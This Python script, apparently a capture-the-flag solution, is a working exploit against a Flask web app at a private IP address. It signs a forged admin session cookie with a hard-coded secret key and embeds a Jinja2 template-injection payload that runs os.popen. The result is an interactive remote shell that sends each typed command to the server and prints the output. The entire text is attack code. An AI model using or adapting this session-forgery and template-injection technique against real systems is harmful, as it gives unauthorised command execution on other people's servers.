from flask import Flask, session
import requests
import json

app = Flask(__name__)
app.secret_key = "Th1s@one!seCret!"  # 只配置 secret_key
url = 'http://172.17.0.15:14947/admin'
print("Enter command (or 'quit' to exit): ")
while True:
    cmd = input()
    if cmd.lower() == 'quit' or not cmd:
        break

    with app.test_request_context('/'):
        session['role'] = {
            "is_admin": 1,
            "name": "yck",
            "secret_key": "VGgxc0BvbmUhc2VDcmV0IQ==",
            "flag": f"{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}"

        }
        # Flask session cookie
        from flask.sessions import SecureCookieSessionInterface

        s = SecureCookieSessionInterface().get_signing_serializer(app)
        key = s.dumps(dict(session))
        # 发送请求，带cookie
        response = requests.get(url, cookies={'session': key})
        text = response.text.replace(", God bless you! The flag is", "")
        print(text)